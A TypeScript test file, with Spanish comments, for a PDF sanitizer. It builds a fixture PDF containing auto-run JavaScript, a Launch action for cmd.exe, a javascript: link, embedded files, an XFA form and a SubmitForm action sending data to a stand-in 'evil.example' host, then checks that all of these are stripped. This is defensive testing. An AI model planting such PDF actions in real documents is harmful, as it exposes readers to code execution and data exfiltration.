import { describe, expect, it } from 'vitest';
import {
  decodePDFRawStream,
  PDFArray,
  PDFDict,
  PDFDocument,
  PDFName,
  PDFRawStream,
  PDFString,
  StandardFonts,
} from 'pdf-lib';
import { describeReport, sanitizePdfBytes, totalRemoved } from '../src/lib/pdf-sanitize';
import { exportEditedPdf } from '../src/editor/export';

/** Todo el texto del PDF: cada objeto, con los flujos descomprimidos (incluidos los de object streams). */
async function fullText(bytes: Uint8Array): Promise<string> {
  const doc = await PDFDocument.load(bytes, { updateMetadata: false });
  const parts: string[] = [];
  for (const [, object] of doc.context.enumerateIndirectObjects()) {
    if (object instanceof PDFRawStream) {
      parts.push(object.dict.toString());
      try {
        parts.push(Buffer.from(decodePDFRawStream(object).decode()).toString('latin1'));
      } catch {
        parts.push(Buffer.from(object.contents).toString('latin1'));
      }
    } else {
      parts.push(object.toString());
    }
  }
  return parts.join('\n');
}

/** PDF con todo lo que un atacante podría esconder: scripts, acciones, adjuntos y enlaces peligrosos. */
async function makeMaliciousPdf(): Promise<Uint8Array> {
  const doc = await PDFDocument.create();
  const font = await doc.embedFont(StandardFonts.Helvetica);
  const page = doc.addPage([300, 200]);
  page.drawText('Contenido visible', { x: 20, y: 100, size: 14, font });
  const context = doc.context;

  const js = (code: string) => context.obj({ S: 'JavaScript', JS: PDFString.of(code) });

  // Script al abrir el documento y script de documento en el árbol de nombres.
  doc.catalog.set(PDFName.of('OpenAction'), context.register(js('app.alert("OPEN_ACTION_PAYLOAD")')));
  const jsTree = context.obj({
    Names: [PDFString.of('init'), context.register(js('app.alert("NAMES_PAYLOAD")'))],
  });
  doc.catalog.set(PDFName.of('Names'), context.obj({ JavaScript: context.register(jsTree) }));

  // Acción automática al abrir la página.
  page.node.set(PDFName.of('AA'), context.obj({ O: context.register(js('app.alert("PAGE_AA_PAYLOAD")')) }));

  // Archivo adjunto en el documento.
  await doc.attach(new TextEncoder().encode('EMBEDDED_FILE_PAYLOAD'), 'virus.exe', { mimeType: 'application/octet-stream' });

  const link = (action: PDFDict, y: number) =>
    context.register(
      context.obj({ Type: 'Annot', Subtype: 'Link', Rect: [10, y, 100, y + 10], Border: [0, 0, 0], A: action }),
    );
  const annots = [
    link(context.obj({ S: 'URI', URI: PDFString.of('https://example.com/ok') }), 10),
    link(context.obj({ S: 'URI', URI: PDFString.of('javascript:alert("URI_PAYLOAD")') }), 30),
    link(context.obj({ S: 'Launch', F: PDFString.of('cmd.exe'), Win: { F: PDFString.of('LAUNCH_PAYLOAD.exe') } }), 50),
    link(context.obj({ S: 'SubmitForm', F: PDFString.of('https://evil.example/collect') }), 70),
    context.register(
      context.obj({
        Type: 'Annot',
        Subtype: 'FileAttachment',
        Rect: [150, 10, 160, 20],
        FS: { Type: 'Filespec', F: PDFString.of('payload.bin') },
      }),
    ),
  ];
  page.node.set(PDFName.of('Annots'), context.obj(annots));

  // Formulario XFA.
  doc.catalog.set(PDFName.of('AcroForm'), context.obj({ Fields: [], XFA: PDFString.of('<xdp>XFA_PAYLOAD</xdp>') }));
  return doc.save();
}

const PAYLOADS = [
  'OPEN_ACTION_PAYLOAD',
  'NAMES_PAYLOAD',
  'PAGE_AA_PAYLOAD',
  'EMBEDDED_FILE_PAYLOAD',
  'URI_PAYLOAD',
  'LAUNCH_PAYLOAD',
  'evil.example',
  'XFA_PAYLOAD',
];

describe('sanitizePdfBytes', () => {
  it('quita scripts, acciones, adjuntos, XFA y enlaces peligrosos', async () => {
    const malicious = await makeMaliciousPdf();
    const before = await fullText(malicious);
    for (const payload of PAYLOADS) expect(before, payload).toContain(payload);

    const { bytes, report } = await sanitizePdfBytes(malicious);
    const text = await fullText(bytes);
    const raw = Buffer.from(bytes).toString('latin1');
    for (const payload of PAYLOADS) {
      expect(text, payload).not.toContain(payload);
      expect(raw, payload).not.toContain(payload);
    }

    expect(report.javascript).toBeGreaterThanOrEqual(3);
    expect(report.embeddedFiles).toBeGreaterThanOrEqual(2);
    expect(report.unsafeLinks).toBe(1);
    expect(report.dangerousActions).toBe(2);
    expect(report.xfaForms).toBe(1);
    expect(describeReport(report)).toContain('scripts JavaScript');
  });

  it('conserva el contenido visible y los enlaces web', async () => {
    const { bytes } = await sanitizePdfBytes(await makeMaliciousPdf());
    const doc = await PDFDocument.load(bytes);
    expect(doc.getPageCount()).toBe(1);
    expect(await fullText(bytes)).toContain('https://example.com/ok');

    const annots = doc.getPage(0).node.Annots();
    expect(annots).toBeInstanceOf(PDFArray);
    const subtypes = annots!.asArray().map((ref) => doc.context.lookup(ref, PDFDict).get(PDFName.of('Subtype')));
    expect(subtypes.every((subtype) => subtype === PDFName.of('Link'))).toBe(true);
  });

  it('no cambia nada en un PDF limpio', async () => {
    const doc = await PDFDocument.create();
    doc.addPage([100, 100]);
    const { report } = await sanitizePdfBytes(await doc.save());
    expect(totalRemoved(report)).toBe(0);
    expect(describeReport(report)).toBe('');
  });
});

describe('exportEditedPdf con un PDF malicioso', () => {
  it('el PDF exportado no lleva acciones de página ni enlaces peligrosos', async () => {
    const { bytes, report } = await exportEditedPdf(await makeMaliciousPdf(), [
      { sourceIndex: 0, rotation: 0, annotations: [] },
    ]);
    const text = await fullText(bytes);
    for (const payload of PAYLOADS) expect(text, payload).not.toContain(payload);
    expect(text).toContain('https://example.com/ok');
    expect(totalRemoved(report)).toBeGreaterThan(0);
  });
});
